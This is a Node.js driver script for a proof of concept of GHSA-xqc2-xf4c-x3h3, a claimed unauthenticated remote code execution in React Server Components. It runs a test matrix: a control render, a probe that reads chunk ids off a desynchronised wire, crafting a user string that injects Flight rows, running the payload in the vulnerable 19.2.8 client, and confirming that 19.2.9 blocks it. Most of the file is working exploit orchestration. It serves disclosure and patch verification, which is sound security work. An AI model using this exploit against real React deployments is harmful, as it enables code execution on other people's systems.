/**
 * Driver for the GHSA-xqc2-xf4c-x3h3 proof of concept.
 *
 * Runs the whole matrix and prints a report:
 *
 *   1. Control        - two typed arrays that own their buffers. Wire is sound.
 *   2. Probe          - the vulnerable shape, with a filler note, to read the
 *                       real chunk ids and row lengths off the wire.
 *   3. Exploit render - same application, same code path; the only difference is
 *                       the user-supplied string.
 *   4. Exploit        - the vulnerable consumer parses it and runs the payload.
 *   5. Patched server - 19.2.9 renders the same model without desynchronising.
 *   6. Patched client - 19.2.9 fed the byte-identical malicious payload.
 *
 * Usage: node poc/run.mjs [--size 3000] [--gadget vm|exec] [--prod]
 */
import {spawn} from 'node:child_process';
import {mkdir, writeFile, readFile, rm, copyFile} from 'node:fs/promises';
import {fileURLToPath} from 'node:url';
import {dirname, join, resolve} from 'node:path';
import {parseRows, formatRows, preview} from '../src/wire.mjs';
import {buildNote, buildExploitCode, GADGETS} from '../src/payload.mjs';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const artifacts = join(root, 'artifacts');
const args = parseArgs(process.argv.slice(2));
const size = Number(args.size ?? 3000);
const gadget = args.gadget ?? 'vm';
const prod = Boolean(args.prod);
// The payload's path is baked into the wire bytes, and step 6 replays those same
// bytes - so it has to clear the same file. Step 4's evidence is copied aside to
// PROOF so a completed run still leaves it behind.
const MARKER = join(artifacts, '.marker.json');
const PROOF = join(artifacts, 'PWNED.json');

const VULNERABLE = join(root, 'env/vulnerable');
const PATCHED = join(root, 'env/patched');

await mkdir(artifacts, {recursive: true});

banner('GHSA-xqc2-xf4c-x3h3 - Unauthenticated RCE in React Server Components');
console.log(`  node            ${process.version}`);
console.log(`  builds          ${prod ? 'production' : 'development'}`);
console.log(`  blob size       ${size} bytes each (VIEW_SIZE is 2048)`);
console.log(`  gadget          ${GADGETS[gadget].describe}`);

// ---------------------------------------------------------------- 1. control
step('1. Control: two typed arrays that each own their ArrayBuffer');
const control = await render({
  env: VULNERABLE,
  mode: 'separate',
  note: 'x'.repeat(size + 2000),
  out: join(artifacts, '01-control.rsc'),
});
console.log(`  ${control.how}`);
console.log(
  `  shared ArrayBuffer: ${control.sharedArrayBuffer} | wire: ${control.wireBytes} bytes | ` +
    `views after render: ${control.afterRender.aByteLength}/${control.afterRender.bByteLength} bytes`,
);
const controlRows = parseRows(await readFile(control.out));
console.log(formatRows(controlRows));
console.log(
  `  => every length-prefixed row's body is present. ` +
    `${describeBinaryRows(controlRows)}`,
);

// ------------------------------------------------------------------ 2. probe
step('2. Probe: the same response, but the two views share one ArrayBuffer');
const probe = await render({
  env: VULNERABLE,
  mode: 'subarray',
  note: 'N'.repeat(size + 2000),
  out: join(artifacts, '02-probe.rsc'),
});
console.log(`  ${probe.how}`);
console.log(
  `  shared ArrayBuffer: ${probe.sharedArrayBuffer} | wire: ${probe.wireBytes} bytes ` +
    `(${control.wireBytes - probe.wireBytes} fewer than the control) | ` +
    `views after render: ${probe.afterRender.aByteLength}/${probe.afterRender.bByteLength} bytes, ` +
    `backing detached: ${probe.afterRender.backingDetached}`,
);
const probeBytes = await readFile(probe.out);
const probeRows = parseRows(probeBytes);
console.log(formatRows(probeRows));

const dropped = probeRows.find(
  r => r.kind === 'length' && r.declaredLength === size && !isUniform(r.body),
);
if (!dropped) fail('could not find a dropped binary row in the probe wire');
console.log(
  `  => row ${dropped.idHex} declares ${dropped.declaredLength} bytes but the server wrote none.\n` +
    `     The client reads ${dropped.declaredLength} bytes anyway, so the rows that follow are\n` +
    `     consumed as that row's "contents": ${JSON.stringify(preview(dropped.body.subarray(0, 48), 48))}`,
);

const noteIdHex = findNoteId(probeRows);
console.log(`  => the attacker's string is carried by chunk id ${noteIdHex}`);

// --------------------------------------------------------------- 3. exploit
step('3. Craft the user-supplied string');
const code = buildExploitCode({markerPath: MARKER, gadget});
const crafted = buildNote({droppedRowLength: size, noteIdHex, code, gadget});
console.log(
  `  note length     ${crafted.noteByteLength} bytes (>= 1024, so React outlines it into a raw T row)\n` +
    `  padding         ${crafted.padding} bytes, so the client resyncs at note offset ${crafted.resyncOffset}\n` +
    `  injected rows   ${crafted.rows.split('\n').filter(Boolean).length} Flight rows, ${crafted.rows.length} bytes`,
);
console.log('\n' + crafted.rows.replace(/^/gm, '    '));

const noteFile = join(artifacts, '03-note.txt');
await writeFile(noteFile, crafted.note);

const exploit = await render({
  env: VULNERABLE,
  mode: 'subarray',
  noteFile,
  out: join(artifacts, '04-exploit.rsc'),
});
const exploitRows = parseRows(await readFile(exploit.out));
console.log(`  wire: ${exploit.wireBytes} bytes. As the client parses it:`);
console.log(formatRows(exploitRows));
console.log(
  '  => the injected rows are now top-level rows of the response, and row ' +
    `${noteIdHex} has been refilled by the attacker.`,
);

// --------------------------------------------------------- 4. vulnerable client
step('4. Consume it with the vulnerable client (19.2.8)');
await rm(MARKER, {force: true});
const hit = await consume({env: VULNERABLE, wire: exploit.out});
report(hit);
if (hit.codeExecuted) {
  await copyFile(MARKER, PROOF);
  console.log(`  evidence preserved at ${PROOF}`);
}

// ------------------------------------------------------------ 5. patched server
step('5. Render the same model with the patched server (19.2.9)');
const patchedRender = await render({
  env: PATCHED,
  mode: 'subarray',
  noteFile,
  out: join(artifacts, '05-patched.rsc'),
});
console.log(
  `  wire: ${patchedRender.wireBytes} bytes | views after render: ` +
    `${patchedRender.afterRender.aByteLength}/${patchedRender.afterRender.bByteLength} bytes, ` +
    `backing detached: ${patchedRender.afterRender.backingDetached}`,
);
const patchedRows = parseRows(await readFile(patchedRender.out));
console.log(formatRows(patchedRows));
const stillDropped = patchedRows.find(
  r => r.kind === 'length' && r.declaredLength === size && !isUniform(r.body),
);
console.log(
  stillDropped
    ? '  => STILL DESYNCHRONISED'
    : "  => both bodies are present: typedArrayToBinaryChunk() now copies a view that does not\n" +
      '     span its whole buffer, so writing one view cannot detach the other.',
);
const patchedHit = await consume({env: PATCHED, wire: patchedRender.out});
console.log(
  `  patched client on the patched wire: userNote=${patchedHit.userNote}, ` +
    `code executed: ${patchedHit.codeExecuted}`,
);

// ------------------------------------------------------------ 6. patched client
step('6. Feed the byte-identical malicious payload to the patched client (19.2.9)');
await rm(MARKER, {force: true});
const blocked = await consume({env: PATCHED, wire: exploit.out});
report(blocked);
console.log(
  '  => a resolved_model chunk now keeps the Response behind a module-private Symbol,\n' +
    "     so the forged chunk's `reason` can no longer stand in for one.",
);

// -------------------------------------------------------------------- verdict
banner('Verdict');
const ok = hit.codeExecuted === true && blocked.codeExecuted === false;
console.log(`  react-server-dom-webpack 19.2.8   code executed: ${hit.codeExecuted}`);
console.log(`  react-server-dom-webpack 19.2.9   code executed: ${blocked.codeExecuted}`);
console.log(`  artifacts in ${artifacts}`);
console.log(ok ? '\n  PoC reproduced.' : '\n  PoC did NOT reproduce as expected.');
process.exit(ok ? 0 : 1);

// ------------------------------------------------------------------- helpers

async function render({env, mode, note, noteFile, out}) {
  let file = noteFile;
  if (!file) {
    file = join(artifacts, '.note.tmp');
    await writeFile(file, note);
  }
  const json = await run(
    process.execPath,
    [
      '--conditions=react-server',
      join(root, 'poc/render.mjs'),
      '--env', env,
      '--out', out,
      '--mode', mode,
      '--size', String(size),
      '--note-file', file,
    ],
    {NODE_ENV: prod ? 'production' : 'development'},
  );
  return {...json, out};
}

async function consume({env, wire}) {
  return run(
    process.execPath,
    [join(root, 'poc/consume.mjs'), '--env', env, '--wire', wire, '--marker', MARKER],
    {NODE_ENV: prod ? 'production' : 'development'},
  );
}

function run(cmd, argv, env) {
  return new Promise((resolvePromise, reject) => {
    const child = spawn(cmd, argv, {
      env: {...process.env, ...env},
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let out = '';
    let err = '';
    child.stdout.on('data', d => (out += d));
    child.stderr.on('data', d => (err += d));
    child.on('error', reject);
    child.on('close', codeExit => {
      // React's development builds log serialization warnings on stderr; they
      // are noise here, not failures.
      const json = out.slice(out.indexOf('{'));
      try {
        resolvePromise(JSON.parse(json));
      } catch {
        reject(
          new Error(
            `child exited ${codeExit} without a JSON report\n--- stdout ---\n${out}\n--- stderr ---\n${err}`,
          ),
        );
      }
    });
  });
}

function report(r) {
  console.log(`  client version  ${r.version} (${r.nodeEnv})`);
  console.log(`  root keys       ${JSON.stringify(r.rootKeys)}`);
  console.log(`  userNote        ${r.userNote}`);
  if (r.error) console.log(`  error           ${r.error}`);
  console.log(`  CODE EXECUTED   ${r.codeExecuted}`);
  if (r.marker) {
    console.log('  evidence written by the payload:');
    console.log(
      JSON.stringify(r.marker, null, 2)
        .split('\n')
        .map(l => '    ' + l)
        .join('\n'),
    );
  }
}

/**
 * The real root row is plain text at the tail of the stream, so its body
 * survives intact even though the desync leaves the parser reading its *id* out
 * of the middle of the note. Match on the body, not the id.
 */
function findNoteId(rows) {
  for (let i = rows.length - 1; i >= 0; i--) {
    const row = rows[i];
    if (row.kind !== 'line') continue;
    try {
      const model = JSON.parse(row.body.toString('utf8'));
      const ref = model.userNote;
      if (typeof ref === 'string' && ref.startsWith('$')) return ref.slice(1);
    } catch {
      /* not the row we want */
    }
  }
  return fail('could not locate the chunk id carrying the user note');
}

function describeBinaryRows(rows) {
  const binary = rows.filter(r => r.kind === 'length' && r.tag !== 'T');
  return binary
    .map(r => `row ${r.idHex}: ${isUniform(r.body) ? 'uniform fill' : 'MIXED'}`)
    .join(', ');
}

function isUniform(buf) {
  if (buf.length === 0) return false;
  for (let i = 1; i < buf.length; i++) if (buf[i] !== buf[0]) return false;
  return true;
}

function banner(text) {
  console.log('\n' + '='.repeat(78) + `\n${text}\n` + '='.repeat(78));
}

function step(text) {
  console.log('\n' + '-'.repeat(78) + `\n${text}\n` + '-'.repeat(78));
}

function fail(message) {
  console.error(`\n  FAILED: ${message}`);
  process.exit(1);
}

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    if (!argv[i].startsWith('--')) continue;
    const key = argv[i].slice(2);
    if (argv[i + 1] && !argv[i + 1].startsWith('--')) out[key] = argv[++i];
    else out[key] = true;
  }
  return out;
}
